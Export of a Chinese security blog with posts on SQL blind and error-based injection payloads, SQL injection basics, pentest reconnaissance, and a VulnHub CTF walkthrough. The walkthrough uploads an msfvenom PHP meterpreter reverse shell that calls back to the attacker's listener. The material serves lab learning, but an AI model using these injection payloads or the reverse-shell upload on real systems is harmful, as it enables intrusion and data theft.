<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">~</span><span class="number">0</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">----------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="operator">~</span><span class="number">0</span>                   <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">18446744073709551615</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="operator">~</span>(<span class="keyword">select</span> <span class="keyword">user</span>());</span><br><span class="line"><span class="operator">+</span><span class="comment">----------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="operator">~</span>(<span class="keyword">select</span> <span class="keyword">user</span>())     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">18446744073709551615</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------------------+</span></span><br></pre></td></tr></table></figure>

<p>因此我们可以利用以下这个语句来注出用户名</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">exp</span>(<span class="operator">~</span>(<span class="keyword">select</span><span class="operator">*</span><span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())x));</span><br></pre></td></tr></table></figure>

<p>将select user()改成我们想要的语句即可。由于exp报错要求的版本太高，因此一般也不会用到。</p>
<p>updatexml报错</p>
<p>updatexml是XPath的语法，其实也可以叫做XPath语法报错</p>
<p>updatexml(XML_document, XPath_string, new_value);</p>
<p>第一个参数：XML_document是String格式，为XML文档对象的名称</p>
<p>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。</p>
<p>第三个参数：new_value，String格式，替换查找到的符合条件的数据作用：改变文档中符合条件的节点的值</p>
<p>XPath语法报错的是特殊字符，即遇到特殊字符就会报错，这里我们选择的是0x7e，即~这个字符</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> database()),<span class="number">0x7e</span>),<span class="number">1</span>);</span><br><span class="line">ERROR <span class="number">1105</span> (HY000): XPATH syntax error: <span class="string">&#x27;~security~&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,substr((<span class="keyword">select</span> database()),<span class="number">1</span>,<span class="number">5</span>),<span class="number">0x7e</span>),<span class="number">1</span>);</span><br><span class="line">ERROR <span class="number">1105</span> (HY000): XPATH syntax error: <span class="string">&#x27;~secur~&#x27;</span></span><br></pre></td></tr></table></figure>

<p>必要时要使用substr函数进行搭配使用。</p>
<p>注入的payload：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1)#</span></span><br></pre></td></tr></table></figure>



<p>extractvalue报错：跟updatexml一样。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and extractvalue(1,concat(0x7e,(select schema_name from information_schema.schemata limit 1,1),0x7e))#</span></span><br></pre></td></tr></table></figure>

<h2 id="4、时间注入"><a href="#4、时间注入" class="headerlink" title="4、时间注入"></a>4、时间注入</h2><p>延时注入常用的函数有sleep()和benchmark()，以及if函数</p>
<p>if语句：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">if(expr1,expr2,expr3)<span class="operator">/</span><span class="operator">/</span>expr1结果为<span class="literal">true</span>则执行expr2，否则执行expr3</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> if(substr(<span class="keyword">user</span>(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;r&#x27;</span>,<span class="number">3</span>,<span class="number">2</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------+</span></span><br><span class="line"><span class="operator">|</span> if(substr(<span class="keyword">user</span>(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;r&#x27;</span>,<span class="number">3</span>,<span class="number">2</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------+</span></span><br><span class="line"><span class="operator">|</span>                              <span class="number">3</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> if(substr(<span class="keyword">user</span>(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;r&#x27;</span>,sleep(<span class="number">5</span>),<span class="number">2</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> if(substr(<span class="keyword">user</span>(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;r&#x27;</span>,sleep(<span class="number">5</span>),<span class="number">2</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------------------+</span></span><br><span class="line"><span class="operator">|</span>                                     <span class="number">0</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">5.00</span> sec)</span><br></pre></td></tr></table></figure>



<p>sleep()函数：以秒为单位，休眠多少秒后执行。报错情况下则不延时。一般配合if语句及其他函数一起使用。</p>
<p>payload：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and sleep(5) %23 //判断注入类型</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> <span class="keyword">select</span> if((ord(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span>ascii(‘a’)),sleep(<span class="number">5</span>),<span class="number">1</span>)#</span><br></pre></td></tr></table></figure>



<p>benchmark(count,expr)函数：对expr执行count次</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> benchmark(<span class="number">5</span>,sleep(<span class="number">1</span>));</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------+</span></span><br><span class="line"><span class="operator">|</span> benchmark(<span class="number">5</span>,sleep(<span class="number">1</span>)) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------+</span></span><br><span class="line"><span class="operator">|</span>                     <span class="number">0</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">5.00</span> sec)</span><br></pre></td></tr></table></figure>

<p>一般也是配合if语句使用。</p>
<p>总结：盲注在注入的时候是比较费时间的，因为只能以猜测的方式去进行注入，关于盲注的一些总结则在上面已经讲完了，详细的payload我就不讲了，大家根据函数的意思搭配使用就完事了。</p>
]]></content>
      <categories>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>sql注入基础篇</title>
    <url>/post/cc508ab0.html</url>
    <content><![CDATA[<hr>
<blockquote>
<p>本章概述：这是一篇关于SQL注入基础的文章</p>
</blockquote>
<hr>
<span id="more"></span>



<p>前言：之前参照前辈的一些文章，写了一篇SQL盲注总结，算是加深对SQL盲注的理解和运用，但是回过头发现，竟然没有SQL注入的基础篇，因此今天写的这篇文章针对的是SQL注入的基础，仅对SQL注入做一个了解，不会有太深的SQL注入的内容，仅针对小白。</p>
<h1 id="1、SQL基础"><a href="#1、SQL基础" class="headerlink" title="1、SQL基础"></a>1、SQL基础</h1><h2 id="1-1、什么是SQL？"><a href="#1-1、什么是SQL？" class="headerlink" title="1.1、什么是SQL？"></a>1.1、什么是SQL？</h2><p>这里我们来理解一下这两个概念——数据库、SQL</p>
<p>数据库简单来说就是数据的集合。经常玩游戏的人会知道一个游戏账号有若干个游戏角色，每个角色又有不同的装备、英雄、宠物等等，那么这些装备、英雄等的数据就是放在数据库中。通过数据库，数据被组织成行、列和表。</p>
<p>数据库的存储是表格式的存储，类似于我们平时使用的表格。表格我们所知道的有行和列之分，一行数据拥有不同的属性，一列数据拥有相同的属性。简单来说，列就是比如姓名表中姓名、性别、年龄这些属性。而行就是每个学生的信息了。</p>
<p>一个数据表中有若干行数据，一个数据库中有若干数据表，一个数据库系统中又有若干个数据库。</p>
<p>SQL是一种标准化的编程语言，用于管理关系型数据库并对其中的数据执行各种操作。</p>
<p>（注：以上说的数据库指的是关系型数据库）</p>
<h2 id="1-2、SQL语句分类"><a href="#1-2、SQL语句分类" class="headerlink" title="1.2、SQL语句分类"></a>1.2、SQL语句分类</h2><p>SQL语句分为好多类，这里我们关注常用的    四类即可。</p>
<p>（1）DQL：数据查询语言。顾名思义，即为查询操作，负责进行数据查询而不会对数据本身进行修改的语句，这是最基本的SQL语句，也是所有SQL中用的最多的语句。关键字为select，各种简单查询，连接查询等都属于DQL。</p>
<p>（2）DML：数据操纵语言。负责对数据库对象运行数据访问工作的指令集，以insert、update、delete三种指令为核心，分别代表插入、更新与删除数据。</p>
<p>（3）DDL：数据定义语言。负责数据结构定义与数据库对象定义的语言，由create、alter和drop三个语法所组成，create创建数据库及其对象（如表、视图等），alter更改现有的数据库结构，drop从数据库中删除对象。</p>
<p>（4）DCL：数据控制语言。是一种可对数据访问权进行控制的指令，它可以控制特定用户账户对数据表、查看表、预存程序、用户自定义函数等数据库对象的控制权。由grant和revoke两个指令组成。DCL以控制用户的访问权限为主，grant为授权语句，对应的revoke是撤销授权语句。</p>
<p>具体SQL语句是怎样写的，网上有很多教程，这里就不具体讲了。</p>
<h1 id="2、SQL注入"><a href="#2、SQL注入" class="headerlink" title="2、SQL注入"></a>2、SQL注入</h1><h2 id="2-1、什么是SQL注入？"><a href="#2-1、什么是SQL注入？" class="headerlink" title="2.1、什么是SQL注入？"></a>2.1、什么是SQL注入？</h2><p>SQL注入攻击指的是通过构建特殊的输入作为参数传入Web应用程序,而这些输入大都是SQL语法里的一些组合,通过执行SQL语句进而执行攻击者所要的操作,其主要原因是程序没有细致地过滤用户输入的数据,致使非法数据侵入系统。</p>
<h2 id="2-2、SQL注入的后果"><a href="#2-2、SQL注入的后果" class="headerlink" title="2.2、SQL注入的后果"></a>2.2、SQL注入的后果</h2><p>成功SQL注入漏洞可以：</p>
<ul>
<li><p>从数据库读取和修改敏感数据</p>
</li>
<li><p>在数据库上执行管理操作</p>
<ul>
<li>关闭审核或DBMS</li>
<li>截断表和日志</li>
<li>新增使用者</li>
</ul>
</li>
<li><p>恢复DBMS文件系统上存在的给定文件的内容</p>
</li>
<li><p>向操作系统发出命令</p>
</li>
</ul>
<p>SQL注入攻击使攻击者能够：</p>
<ul>
<li>欺骗身份</li>
<li>篡改现有数据</li>
<li>导致拒绝问题，例如使交易无效或余额发生变化</li>
<li>允许完全公开系统上的所有数据</li>
<li>销毁数据或使其不可用</li>
<li>成为数据库服务器的管理员</li>
</ul>
<h2 id="2-3、字符串SQL注入"><a href="#2-3、字符串SQL注入" class="headerlink" title="2.3、字符串SQL注入"></a>2.3、字符串SQL注入</h2><p>下面我们来试试简单的SQL注入，这里我们直接使用mysql来模拟真实场景。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//假设下面的语句是真实一个登录场景的SQL语句，当username和password输入正确时才会返回结果，没有对输入的内容做任何过滤</span><br><span class="line">select * from users where username=&#x27;&#x27; and password=&#x27;&#x27;;</span><br><span class="line">//上述的语句在正常用户输入正常的用户名密码的时候，是不会产生问题的，但是当黑客或者渗透人员在输入的时候，就会输入一些特殊的语句来尝试注入。</span><br><span class="line">//当password输入&#x27; or 1=1#时，我们会发现，现在的SQL语句是这样子的。</span><br><span class="line">select * from users where username=&#x27;&#x27; and password=&#x27;&#x27; or 1=1#&#x27;;</span><br><span class="line">MariaDB [security]&gt; select * from users where username=&#x27;&#x27; and password=&#x27;&#x27; or 1=1#&#x27;;</span><br><span class="line">    -&gt; ;</span><br><span class="line">+----+----------+------------+</span><br><span class="line">| id | username | password   |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">|  1 | Dumb     | Dumb       |</span><br><span class="line">|  2 | Angelina | I-kill-you |</span><br><span class="line">|  3 | Dummy    | p@ssword   |</span><br><span class="line">|  4 | secure   | crappy     |</span><br><span class="line">|  5 | stupid   | stupidity  |</span><br><span class="line">|  6 | superman | genious    |</span><br><span class="line">|  7 | batman   | mob!le     |</span><br><span class="line">|  8 | admin    | admin      |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">//我们在没有输入正确的用户名密码的情况下，把所有信息都取出来了，这里的&#x27; or 1=1#我们也叫永真式，后面的or1=1是永远都成立的，因此这整个SQL语句永久成立，自然就把信息全都取出来了</span><br></pre></td></tr></table></figure>

<p>具体的东西我也不讲太多，毕竟是基础篇，想深入的小伙伴可以先去学学SQL语法，不用学的很深，会增删改查就OK了，另外推荐大家安装dvwa平台，可以在里面练习SQL注入。另外也有一个实验平台专门练习SQL注入的，叫sqli-labs，大家可以上网查一查，关于dvwa搭建流程我在之前的文章有说到，可以去看看。</p>
<p>相关文章：<a href="./d1dcde3a.html">dvwa搭建</a></p>
]]></content>
      <categories>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透测试之信息收集</title>
    <url>/post/8d90fcdb.html</url>
    <content><![CDATA[<hr>
<blockquote>
<p>本章概述：这是一篇关于信息收集的文章</p>
</blockquote>
<hr>
<span id="more"></span>





<p>一般来说，在做渗透测试之前，都会进行信息收集，尽可能多的获取目标的信息，这对我们的渗透工作会帮助很大。信息收集一般有域名及子域名信息、目标网站系统、指纹信息、端口信息等等。</p>
<h1 id="1、域名信息"><a href="#1、域名信息" class="headerlink" title="1、域名信息"></a>1、域名信息</h1><p>获得目标域名之后，第一步应该先获得该域名的注册信息、注册人信息等等。</p>
<h2 id="1-1、Whois查询"><a href="#1-1、Whois查询" class="headerlink" title="1.1、Whois查询"></a>1.1、Whois查询</h2><p>用于收集网络注册信息、注册域名、IP地址等信息。</p>
<p>kali已经安装有whois工具，可以直接通过whois命令查询</p>
<img src="https://i.loli.net/2020/09/19/jZyJMzV8b6loWHr.png" style="zoom:150%;" />

<p>nslookup、dig查询（DNS域名信息查询工具）</p>
<p>命令：dig xxx.com，nslookup xxx.com</p>
<p>两者不同的是nslookup获取到的是DNS服务器上cache找到的结果，而dig则是查询到的精确结果</p>
<p>常用的在线查询网站：</p>
<p><a href="http://whois.chinaz.com/">http://whois.chinaz.com/</a></p>
<p><a href="https://whois.aizhan.com/">https://whois.aizhan.com/</a></p>
<p><a href="https://who.is/">https://who.is/</a></p>
<h2 id="1-2、备案信息查询"><a href="#1-2、备案信息查询" class="headerlink" title="1.2、备案信息查询"></a>1.2、备案信息查询</h2><p>国内的网站的所有者都需要向国家有关部门申请备案，因此通过备案信息查询也可以查询到域名的一些信息。</p>
<p>常用的网站有：</p>
<p><a href="https://www.tianyancha.com/">天眼查</a></p>
<p><a href="http://www.beianbeian.com/">ICP备案查询网</a></p>
<h1 id="2、收集敏感信息"><a href="#2、收集敏感信息" class="headerlink" title="2、收集敏感信息"></a>2、收集敏感信息</h1><h2 id="2-1、Google-Hacking"><a href="#2-1、Google-Hacking" class="headerlink" title="2.1、Google Hacking"></a>2.1、Google Hacking</h2><p>Google是很好的一门收集敏感信息的搜索引擎，通过Google Hacking语法，可以搜索到泄露的信息。</p>
<p>下面列举了部分常用的语法：</p>
<table>
<thead>
<tr>
<th>语法</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>intitle</td>
<td>搜索网页标题中包含有特定字符的网页</td>
</tr>
<tr>
<td>inurl</td>
<td>搜索包含有特定字符的URL</td>
</tr>
<tr>
<td>filetype</td>
<td>搜索指定类型的文件。比如输入filetype:txt，将返回所有以txt结尾的文件url</td>
</tr>
<tr>
<td>site</td>
<td>找到与指定网站有联系的URL</td>
</tr>
<tr>
<td>intext</td>
<td>把网页中的正文内容中的某个字符做为搜索条件</td>
</tr>
<tr>
<td>cache</td>
<td>搜索google里关于某些内容的缓存</td>
</tr>
<tr>
<td>link</td>
<td>搜索所有和指定url做了链接的url</td>
</tr>
<tr>
<td>info</td>
<td>查找指定站点的一些基本信息</td>
</tr>
</tbody></table>
<p>其他搜索引擎也可以用这种方法，语法基本无差</p>
<img src="https://i.loli.net/2020/09/19/9t2DWfG7alUxwOF.png" style="zoom:150%;" />

<h2 id="2-2、GitHub"><a href="#2-2、GitHub" class="headerlink" title="2.2、GitHub"></a>2.2、GitHub</h2><p>GitHub上面也可以利用GitHub语法去进行搜索，可以找到部分敏感信息，比如代码泄露、账号密码之类的。</p>
<p>基本的搜索语法有：</p>
<table>
<thead>
<tr>
<th>语法</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>in:name  xxxx</td>
<td>搜索仓库标题含有xxxx</td>
</tr>
<tr>
<td>in:descripton   xxxx</td>
<td>搜索仓库描述含有xxxx</td>
</tr>
<tr>
<td>in:readme  xxxx</td>
<td>搜索readme文件含有xxxx</td>
</tr>
<tr>
<td>stars:&gt;3000</td>
<td>搜索stars大于3000的仓库</td>
</tr>
<tr>
<td>stars:1000..3000</td>
<td>stars数量大于1000小于3000的仓库</td>
</tr>
<tr>
<td>forks:&gt;1000</td>
<td>forks数量大于1000的搜索关键字</td>
</tr>
<tr>
<td>size:&gt;&#x3D;5000</td>
<td>仓库大于5000k(5M)的搜索仓库</td>
</tr>
<tr>
<td>pushed:&gt;2019-02-12</td>
<td>发布时间大于2019-02-12的仓库</td>
</tr>
<tr>
<td>created:&gt;2019-02-12</td>
<td>创建时间大于2019-02-12的仓库</td>
</tr>
<tr>
<td>mirror:true(false)</td>
<td>是否是镜像仓库</td>
</tr>
<tr>
<td>user:jack</td>
<td>用户名为”jack”的仓库</td>
</tr>
<tr>
<td>license:apache-2.0</td>
<td>仓库的 LICENSE为”apache-2.0”</td>
</tr>
<tr>
<td>language:java</td>
<td>使用”java”语言的仓库</td>
</tr>
<tr>
<td>is:public</td>
<td>公开的仓库</td>
</tr>
<tr>
<td>is:private</td>
<td>匹配有权限的私有仓库</td>
</tr>
<tr>
<td>topic:5</td>
<td>匹配拥有5个topic的仓库</td>
</tr>
</tbody></table>
<p>另外也有其他方法可以查看敏感信息，比如发包，看返回包，可以看到一些服务器信息。</p>
<h1 id="3、子域名信息"><a href="#3、子域名信息" class="headerlink" title="3、子域名信息"></a>3、子域名信息</h1><p>子域名也就是二级域名，一般情况下，一个网站的主站防守肯定是最严格的，因此直接硬干主站不太理智，所以更多的是去测试那些二级域名，甚至是三级域名、四级域名。因此我们需要收集很多的子域名，方便我们进行渗透。</p>
<h2 id="3-1、子域名检测工具"><a href="#3-1、子域名检测工具" class="headerlink" title="3.1、子域名检测工具"></a>3.1、子域名检测工具</h2><p>（1）Layer子域名挖掘机</p>
<p><img src="https://i.loli.net/2020/09/19/Ov95zC1n8rEIUQf.png"></p>
<p>（2）Sublist3r</p>
<p>也是一款挺不错的子域名爆破工具</p>
<p>（3）subDomainsBrute</p>
<p>这一款可以递归发现三级域名、四级域名等不容易被探测到的域名</p>
<h2 id="3-2、搜索引擎"><a href="#3-2、搜索引擎" class="headerlink" title="3.2、搜索引擎"></a>3.2、搜索引擎</h2><p>利用Google Hacking查询子域名，前面有说过语法，这里就不多说了。</p>
<h2 id="3-3、证书透明度公开日志枚举"><a href="#3-3、证书透明度公开日志枚举" class="headerlink" title="3.3、证书透明度公开日志枚举"></a>3.3、证书透明度公开日志枚举</h2><p>证书透明度是证书授权机构的一个项目，证书授权机构会将每个SSL或者TLS证书发布到公共日志中去，证书一般都会包含域名、子域名等信息。</p>
<p>crt.sh：<a href="https://crt.sh/">https://crt.sh/</a></p>
<p>censys：<a href="https://censys.io/">https://censys.io/</a></p>
<h1 id="4、开放端口收集"><a href="#4、开放端口收集" class="headerlink" title="4、开放端口收集"></a>4、开放端口收集</h1><p>端口扫描是最常见的信息收集方法。最常见的扫描工具有nmap、御剑端口扫描工具。</p>
<p>nmap除了可以扫描端口，还可以扫描存活主机、指纹识别等，是一款很强大的扫描工具，具体怎么扫描网上也有很多教程。</p>
<p>本文所说的信息收集方法皆以kali作为前提</p>
<h1 id="5、指纹识别"><a href="#5、指纹识别" class="headerlink" title="5、指纹识别"></a>5、指纹识别</h1><p>这里的指纹识别指的是CMS指纹识别，操作系统以及web容器的指纹识别。</p>
<p>CMS：快速搭建网站的管理系统。在早期的web系统中，我们要发布一篇文章是相对比较困难的，需要有专业的web人员来编写，十分不方便，后来就有了CMS系统来帮助开发和搭建。</p>
<p>常见的CMS有：Dedecms、phpweb、帝国、WordPress等等</p>
<p>其他的CMS可以参考这篇文章：<a href="https://www.cnblogs.com/sym945/p/11715984.html">https://www.cnblogs.com/sym945/p/11715984.html</a></p>
<p>代表工具有：御剑指纹识别、whatweb，轻量指纹识别等等。</p>
<p>也有一些在线网站，比如：</p>
<p>BugScanner：<a href="http://whatweb.bugscaner.com/look/">http://whatweb.bugscaner.com/look/</a></p>
<p>云悉识别：<a href="https://www.yunsee.cn/">https://www.yunsee.cn/</a></p>
<p>whatweb：<a href="https://whatweb.net/">https://whatweb.net/</a></p>
<h1 id="6、CDN"><a href="#6、CDN" class="headerlink" title="6、CDN"></a>6、CDN</h1><p>CDN：内容分发网络。简单来说就是在各地都有节点服务器，访问的时候就近去附近的节点获取资源，主要是为了改善网络加载时间，减少服务器负载。但是这样就会造成我们没法直接去得到真实的ip。</p>
<h2 id="6-1、判断是否使用了CDN"><a href="#6-1、判断是否使用了CDN" class="headerlink" title="6.1、判断是否使用了CDN"></a>6.1、判断是否使用了CDN</h2><p>一般可以用多地ping的方式来判断是否使用了CDN。</p>
<p>多地ping：<a href="https://www.17ce.com/">https://www.17ce.com/</a>	</p>
<p><a href="http://ping.chinaz.com/tb.sz.gov.cn">http://ping.chinaz.com/tb.sz.gov.cn</a></p>
<h2 id="6-2、寻找真实ip"><a href="#6-2、寻找真实ip" class="headerlink" title="6.2、寻找真实ip"></a>6.2、寻找真实ip</h2><p>二级域名：可以通过ping二级域名来获取分站ip，分站可能没有挂cdn，因此可以大概推断出真实ip是在哪个网段</p>
<p>国外访问：可以通过代理国外访问，一般cdn是针对国内，国外没有效果。可以通过国外在线代理ping来访问（<a href="https://asm.ca.com/en/ping.php%EF%BC%89%E3%80%82">https://asm.ca.com/en/ping.php）。</a></p>
<p>查询域名解析记录：<a href="https://www.benmi.com/whoishistory/">历史Whois</a>，<a href="https://x.threatbook.cn/">微步在线</a></p>
<p>手机APP：有APP的可以用brup抓包获得真实ip</p>
<p>网络空间搜索引擎：<a href="%5Bhttps://fofa.so%5D(https://fofa.so/)">fofa</a></p>
<h1 id="7、收集敏感目录"><a href="#7、收集敏感目录" class="headerlink" title="7、收集敏感目录"></a>7、收集敏感目录</h1><p>收集敏感目录文件是渗透测试中必不可少的一个步骤，常用的目录扫描工具有：</p>
<p>dirbuster，御剑后台扫描，wwwscan，nikto等</p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>靶机渗透训练——JIS-CTF-VulnUpload-CTF01</title>
    <url>/post/eca5dc88.html</url>
    <content><![CDATA[<hr>
<blockquote>
<p>本章概述：这是一篇关于JIS-CTF-VulnUpload-CTF01靶机训练的文章</p>
</blockquote>
<hr>
<span id="more"></span>



<h1 id="1、前提准备"><a href="#1、前提准备" class="headerlink" title="1、前提准备"></a>1、前提准备</h1><p>靶机文件下载好之后，导入虚拟机。<br>不过这个靶机有点小问题，一开始网卡起不来，上网找了找解决方法。<br>解决方法：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">账号口令 technawi - 3vilH@ksor</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启用网卡</span></span><br><span class="line">sudo ifconfig ens33 up </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">分配IP</span></span><br><span class="line">sudo dhclient</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在/etc/network/interfaces文件添加相关信息</span></span><br><span class="line">auto ens33</span><br><span class="line">iface ens33 inet dhcp</span><br></pre></td></tr></table></figure>

<p>另外需要一台攻击机，这里我用的是kali。</p>
<h1 id="2、主机发现"><a href="#2、主机发现" class="headerlink" title="2、主机发现"></a>2、主机发现</h1><p>一开始我们是不知道这个靶机的ip地址的，因此我们需要先对网段进行扫描</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.110.0/24</span><br></pre></td></tr></table></figure>

<img src="https://i.loli.net/2020/09/03/3nBORFrI4tc91gN.png" style="zoom:150%;" />

<p>kali的ip是192.168.110.128，靶机的ip是192.168.110.130</p>
<h1 id="3、端口扫描"><a href="#3、端口扫描" class="headerlink" title="3、端口扫描"></a>3、端口扫描</h1><p>存活端口扫描，他这里并没有做任何的限制，因此我们直接扫描就可以了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap 192.168.110.130</span><br></pre></td></tr></table></figure>

<img src="https://i.loli.net/2020/09/03/aViXkbTm15QgfLR.png" style="zoom:150%;" />

<p>有80 http以及22 ssh两个端口存活。<br>我们试着访问80端口</p>
<p><img src="https://i.loli.net/2020/09/03/psq1aMwJeAEWU3C.png"></p>
<p>自动跳转到一个登陆页面，不知道账号密码，同时源码中也没有其他有用的信息。</p>
<h1 id="4、目录扫描"><a href="#4、目录扫描" class="headerlink" title="4、目录扫描"></a>4、目录扫描</h1><p>一开始使用的是dirb工具来扫，但是扫完发现文件太多了。<br>因此后面使用另一个扫描工具扫——nikto</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nikto -h http://192.168.110.130 &gt; nikto扫描结果.txt</span><br></pre></td></tr></table></figure>

<p>将扫描结果进行整理，有用的路径如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.110.130/admin_area</span><br><span class="line">http://192.168.110.130/flag</span><br><span class="line">http://192.168.110.130/robots.txt</span><br><span class="line">http://192.168.110.130/login.php</span><br><span class="line">http://192.168.110.130/uploaded_files</span><br></pre></td></tr></table></figure>

<p>在<code>http://192.168.110.130/admin_area</code>源代码中发现如下信息：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!--    username : admin</span><br><span class="line">    password : 3v1l_H@ck3r</span><br><span class="line">    The 2nd flag is : &#123;7412574125871236547895214&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>

<p>在<code>http://192.168.110.130/flag</code>发现：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">The 1st flag is : &#123;8734509128730458630012095&#125;</span><br></pre></td></tr></table></figure>

<p><code>login.php</code>是一开始我们就看到的登录页面，<code>uploaded_files</code>为空，暂时不知道这个文件是干嘛的。<code>rebots.txt</code>记录了一些目录信息<br>到这里我们已经找到了两个flag</p>
<h1 id="5、上传文件"><a href="#5、上传文件" class="headerlink" title="5、上传文件"></a>5、上传文件</h1><p>上面目录扫描的时候，有发现账号密码，用这个账号密码登录后发现这是一个上传文件的页面。</p>
<p><img src="https://i.loli.net/2020/09/03/JOu3ZyTVe9sSEDa.png"></p>
<p>我们试着上传一个文件，1.txt，并用bp抓包</p>
<p><img src="https://i.loli.net/2020/09/03/jJlhVB3kRSdQKYG.png"></p>
<p>更改数据包的一些信息，发现仍然可以上传成功，因此这里的上传点并没有做限制</p>
<p><img src="https://i.loli.net/2020/09/03/FBo3l7n9uLOGXeJ.png"></p>
<p>用msfvenom生成php木马并上传上去。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p  php/meterpreter/reverse_tcp  lhost=192.168.110.128 lport=8888 -f raw -o z7sz.php</span><br></pre></td></tr></table></figure>

<p>用msfconsole去监听。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload php/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.110.128</span><br><span class="line">set LPORT 8888</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<p>之后访问我们上传的木马就可以监听到了，这里有个问题就是我们并不知道上传的文件放在哪里，结合上面的目录扫描中有一个奇怪的目录<code>uploaded_files</code>，试着访问<code>http://192.168.110.130/uploaded_files/z7sz.php</code>，访问成功，说明上传的文件是放在<code>uploaded_files</code>这个文件夹里面的。</p>
<img src="https://i.loli.net/2020/09/03/BKS1kH9j2IvT8bo.png" style="zoom:150%;" />

<p>反弹成功并拿到交互shell。<br>回到<code>/var/www/html</code>目录发现有个flag.txt文件，但是没有权限去访问</p>
<p>访问hint.txt文件</p>
